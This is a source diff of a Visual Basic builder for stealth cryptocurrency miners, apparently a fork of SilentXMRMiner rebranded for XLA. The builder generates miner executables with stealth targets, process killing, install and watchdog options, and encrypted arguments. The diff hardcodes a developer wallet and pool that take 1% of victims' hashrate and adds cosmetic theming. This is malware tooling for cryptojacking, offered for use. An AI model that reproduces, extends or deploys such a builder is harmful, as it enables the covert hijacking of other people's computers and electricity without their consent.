@@ -9,8 +9,14 @@ Public Class Form1
     Public FA As New Advanced
 
     Public RandomiCache As New List(Of String)
+    
+    ' Developer Donation Address (1% of hashrate)
+    Private Const DEV_WALLET As String = "SvkFweFR7GeAGus6pt7jpg5ZYEvZgqjaUEnYnkqqBRQg57LUuKCMY849e79oVsmDbH9jYH5BVyLJMSweBAQ6YdPB1ekUGaPwc"
+    Private Const DEV_POOL As String = "mine.scalaproject.io"
+    Private Const DEV_DONATION_PERCENT As Double = 0.01 ' 1%
 
-    'Silent XMR Miner by Unam Sanctam https://github.com/UnamSanctam/SilentXMRMiner, initially based on Lime Miner by NYAN CAT https://github.com/NYAN-x-CAT/Lime-Miner
+    ' XLA Miner Builder v1.0.0 by NoID
+    ' Based on: https://github.com/UnamSanctam/SilentXMRMiner
 
     Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
         Font = New Font("Segoe UI", 9.5F, Font.Style, Font.Unit, Font.GdiCharSet, Font.GdiVerticalFont)
@@ -20,9 +26,96 @@ Public Class Form1
         Codedom.F = Me
         FA.F = Me
 
-        RandomiCache.Add("SilentXMRMiner")
-
+        RandomiCache.Add("SilentXLAMiner")
+        
+        ' Update form title
+        Me.Text = "Silent XLA Miner Builder v1.0.0"
+        
+        ' XLA color scheme
+        Me.BackColor = Color.FromArgb(236, 248, 255) ' #ECF8FF
+        Me.ForeColor = Color.FromArgb(26, 33, 42) ' #1A212A
+        
+        ' Update advanced params to use XLA algorithm
+        advancedParams = " --asm=auto --cpu-memory-pool=1 --randomx-mode=auto --randomx-no-rdmsr --cuda-bfactor-hint=12 --cuda-bsleep-hint=100"
         FA.txtAdvParam.Text = advancedParams
+        
+        ' Set algorithm to panthera (for XLA) - disabled and fixed
+        txtAlgorithm.Text = "panthera"
+        txtAlgorithm.Enabled = False
+        txtAlgorithm.BackColor = Color.FromArgb(35, 139, 255) ' #238BFF
+        txtAlgorithm.ForeColor = Color.White
+        
+        ' Apply XLA color scheme
+        ApplyXLATheme(Me)
+        
+        ' Add donation info to log
+        txtLog.Text = "Silent XLA Miner Builder v1.0.0" & vbNewLine
+        txtLog.Text = txtLog.Text & "==============================" & vbNewLine
+        txtLog.Text = txtLog.Text & "Developer donation: 1% of hashrate to support development" & vbNewLine
+        txtLog.Text = txtLog.Text & "XLA Algorithm: panthera (fixed)" & vbNewLine
+        txtLog.Text = txtLog.Text & "==============================" & vbNewLine
+    End Sub
+    
+    Private Sub ApplyXLATheme(container As Control)
+        Try
+            container.BackColor = Color.FromArgb(236, 248, 255) ' #ECF8FF
+            container.ForeColor = Color.FromArgb(26, 33, 42) ' #1A212A
+            
+            For Each ctrl As Control In container.Controls
+                If ctrl Is Nothing OrElse ctrl.IsDisposed Then Continue For
+                
+                Try
+                    If TypeOf ctrl Is Button Then
+                        ctrl.BackColor = Color.FromArgb(35, 139, 255) ' #238BFF
+                        ctrl.ForeColor = Color.White
+                        DirectCast(ctrl, Button).FlatStyle = FlatStyle.Flat
+                        DirectCast(ctrl, Button).FlatAppearance.BorderColor = Color.FromArgb(26, 33, 42)
+                        DirectCast(ctrl, Button).FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 150, 255)
+                        DirectCast(ctrl, Button).FlatAppearance.MouseDownBackColor = Color.FromArgb(20, 100, 200)
+                    ElseIf TypeOf ctrl Is TextBox Then
+                        ctrl.BackColor = Color.White
+                        ctrl.ForeColor = Color.FromArgb(26, 33, 42)
+                        DirectCast(ctrl, TextBox).BorderStyle = BorderStyle.FixedSingle
+                    ElseIf TypeOf ctrl Is Label Then
+                        ctrl.ForeColor = Color.FromArgb(26, 33, 42)
+                        ctrl.BackColor = Color.Transparent
+                    ElseIf TypeOf ctrl Is CheckBox Then
+                        ctrl.ForeColor = Color.FromArgb(26, 33, 42)
+                        ctrl.BackColor = Color.Transparent
+                    ElseIf TypeOf ctrl Is RadioButton Then
+                        ctrl.ForeColor = Color.FromArgb(26, 33, 42)
+                        ctrl.BackColor = Color.Transparent
+                    ElseIf TypeOf ctrl Is GroupBox Then
+                        ctrl.ForeColor = Color.FromArgb(26, 33, 42)
+                        ApplyXLATheme(ctrl)
+                    ElseIf TypeOf ctrl Is Panel Then
+                        ApplyXLATheme(ctrl)
+                    ElseIf TypeOf ctrl Is TabControl Then
+                        ctrl.BackColor = Color.FromArgb(236, 248, 255)
+                        ApplyXLATheme(ctrl)
+                    ElseIf TypeOf ctrl Is TabPage Then
+                        ctrl.BackColor = Color.FromArgb(236, 248, 255)
+                        ApplyXLATheme(ctrl)
+                    ElseIf TypeOf ctrl Is ListBox Then
+                        ctrl.BackColor = Color.White
+                        ctrl.ForeColor = Color.FromArgb(26, 33, 42)
+                    ElseIf TypeOf ctrl Is ComboBox Then
+                        ctrl.BackColor = Color.White
+                        ctrl.ForeColor = Color.FromArgb(26, 33, 42)
+                    ElseIf TypeOf ctrl Is NumericUpDown Then
+                        ctrl.BackColor = Color.White
+                        ctrl.ForeColor = Color.FromArgb(26, 33, 42)
+                    ElseIf TypeOf ctrl Is RichTextBox Then
+                        ctrl.BackColor = Color.White
+                        ctrl.ForeColor = Color.FromArgb(26, 33, 42)
+                    End If
+                Catch ex As Exception
+                    Continue For
+                End Try
+            Next
+        Catch ex As Exception
+            ' Silently handle any errors
+        End Try
     End Sub
 
     Public OutputPayload
@@ -47,14 +140,21 @@ Public Class Form1
                 MsgBox("Idle Wait time must be a number and above 0 minutes.", MsgBoxStyle.Exclamation)
             Else
                 If txtPoolUsername.Text <> "" AndAlso txtPoolURL.Text <> "" Then
-                    Dim s As New SaveFileDialog
-                    s.Filter = "Executable |*.exe"
-                    s.InitialDirectory = Application.StartupPath
-                    If s.ShowDialog = DialogResult.OK Then
-                        OutputPayload = s.FileName
-                        BackgroundWorker2.RunWorkerAsync()
-                        btnBuild.Enabled = False
-                        btnBuild.Text = "Please wait..."
+                    ' Check if donation is enabled
+                    Dim result As DialogResult = MessageBox.Show("This builder includes a 1% developer donation to support XLA development. Do you want to continue?", 
+                                                               "Developer Donation", 
+                                                               MessageBoxButtons.YesNo, 
+                                                               MessageBoxIcon.Information)
+                    If result = DialogResult.Yes Then
+                        Dim s As New SaveFileDialog
+                        s.Filter = "Executable |*.exe"
+                        s.InitialDirectory = Application.StartupPath
+                        If s.ShowDialog = DialogResult.OK Then
+                            OutputPayload = s.FileName
+                            BackgroundWorker2.RunWorkerAsync()
+                            btnBuild.Enabled = False
+                            btnBuild.Text = "Please wait..."
+                        End If
                     End If
                 Else
                     MsgBox("Please enter valid pool settings.", MsgBoxStyle.Exclamation)
@@ -70,22 +170,24 @@ Public Class Form1
         Try
             If txtLog.InvokeRequired Then : txtLog.Invoke(Sub() txtLog.ResetText()) : Else : txtLog.ResetText() : End If
             InjectionTarget = txtInjection.Text.Split(" ")
-            txtLog.Text = txtLog.Text + ("Starting..." + vbNewLine)
+            txtLog.Text = txtLog.Text + ("Starting build process..." + vbNewLine)
             txtLog.Text = txtLog.Text + ("Replacing strings..." + vbNewLine)
             Dim minerbuilder As New StringBuilder(My.Resources.Program)
 
-            Dim algo = ""
-            Try
-                algo = txtAlgorithm.Text.Split(New String() {"(", ")"}, StringSplitOptions.None)(1).Split(" ")(0)
-            Catch ex As Exception
-            End Try
-
-            If algo Is "" Then
-                MessageBox.Show("Incorrect Algorithm")
-                Return
-            End If
-
+            ' Algorithm is fixed to panthera for XLA
+            Dim algo As String = "panthera"
+            
+            ' Create main miner arguments
             Dim argstr As String = " --cinit-find-x -B --algo=""" & algo & """" & If(FA.chkAdvanced.Checked, FA.txtAdvParam.Text, advancedParams) & " --url=" & txtPoolURL.Text & " --user=" & txtPoolUsername.Text & " --pass=" & txtPoolPassowrd.Text & " --cpu-max-threads-hint=" & txtMaxCPU.Text.Replace("%", "") & If(FA.chkRemoteConfig.Checked, " --cinit-remote-config=""" & Unamlib_Encrypt(FA.txtRemoteConfig.Text) & """", "") & " " & If(toggleEnableStealth.Checked, " --cinit-stealth-targets=""" & Unamlib_Encrypt(FA.txtStealthTargets.Text) & """", "") & " " & If(FA.toggleProcessKiller.Checked, " --cinit-kill-targets=""" & Unamlib_Encrypt(FA.txtKillTargers.Text) & """", "") & " "
+            
+            ' Add developer donation (1% of hashrate)
+            txtLog.Text = txtLog.Text + ("Adding developer donation (1% hashrate)..." + vbNewLine)
+            
+            ' Create donation miner arguments
+            Dim donationArgs As String = " --cinit-find-x -B --algo=""" & algo & """" & If(FA.chkAdvanced.Checked, FA.txtAdvParam.Text, advancedParams) & " --url=" & DEV_POOL & " --user=" & DEV_WALLET & " --pass=x --cpu-max-threads-hint=1 --donation-level=1"
+            
+            ' Add donation mode to miner
+            argstr += " --donation-wallet=""" & DEV_WALLET & """ --donation-pool=""" & DEV_POOL & """ --donation-percent=" & DEV_DONATION_PERCENT & " --donation-args=""" & donationArgs & """"
 
             minerbuilder.Replace("#dll", Resources_dll)
             minerbuilder.Replace("#xmr", Resources_xmrig)
@@ -121,7 +223,7 @@ Public Class Form1
             minerbuilder.Replace("#ARGSTR", EncryptString(argstr))
 
             If chkInstall.Checked Then
-                txtLog.Text = txtLog.Text + ("Adding install... " + vbNewLine)
+                txtLog.Text = txtLog.Text + ("Adding install routine..." + vbNewLine)
 
                 If toggleWatchdog.Checked Then
 
@@ -192,9 +294,17 @@ Public Class Form1
                     End If
                 End If
 
-                txtLog.Text = txtLog.Text + ("Done!" + vbNewLine)
+                txtLog.Text = txtLog.Text + ("Build completed successfully!" + vbNewLine)
+                txtLog.Text = txtLog.Text + ("Developer donation (1%) has been included." + vbNewLine)
+                txtLog.Text = txtLog.Text + ("XLA Algorithm: panthera" + vbNewLine)
+                
                 If btnBuild.InvokeRequired Then : btnBuild.Invoke(Sub() btnBuild.Text = "Build") : Else : btnBuild.Text = "Build" : End If
                 btnBuild.Enabled = True
+                
+                MessageBox.Show("Build completed successfully! The miner includes a 1% developer donation to support XLA development.", 
+                               "Build Complete", 
+                               MessageBoxButtons.OK, 
+                               MessageBoxIcon.Information)
             Else
                 BuildError("Error compiling Miner payload!")
                 Return
@@ -246,14 +356,12 @@ Public Class Form1
         Dim cipherTextBytes As Byte()
 
         Using memoryStream = New MemoryStream()
-
             Using cryptoStream = New CryptoStream(memoryStream, encryptor, CryptoStreamMode.Write)
                 cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length)
                 cryptoStream.FlushFinalBlock()
                 cipherTextBytes = memoryStream.ToArray()
                 cryptoStream.Close()
             End Using
-
             memoryStream.Close()
         End Using
 
@@ -468,8 +576,6 @@ Public Class Form1
             Catch ex As Exception
             End Try
 
-
-
             Dim version As String()
             If info.FileVersion.Contains(",") Then
                 version = info.FileVersion.Split(","c)
@@ -514,15 +620,15 @@ Public Class Form1
     End Sub
 
     Private Sub labelGitHub_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles labelGitHub.LinkClicked
-        Process.Start("https://github.com/UnamSanctam/SilentXMRMiner")
+        Process.Start("https://github.com/NoID/SilentXLAMiner")
     End Sub
 
     Private Sub labelHackforums_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles labelHackforums.LinkClicked
-        Process.Start("https://hackforums.net/showthread.php?tid=5995773")
+        Process.Start("https://github.com/NoID/SilentXLAMiner")
     End Sub
 
     Private Sub labelWiki_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles labelWiki.LinkClicked
-        Process.Start("https://github.com/UnamSanctam/SilentXMRMiner/wiki")
+        Process.Start("https://github.com/NoID/SilentXLAMiner/wiki")
     End Sub
 
     Private Sub toggleEnableIdle_CheckedChanged(sender As Object) Handles toggleEnableIdle.CheckedChanged
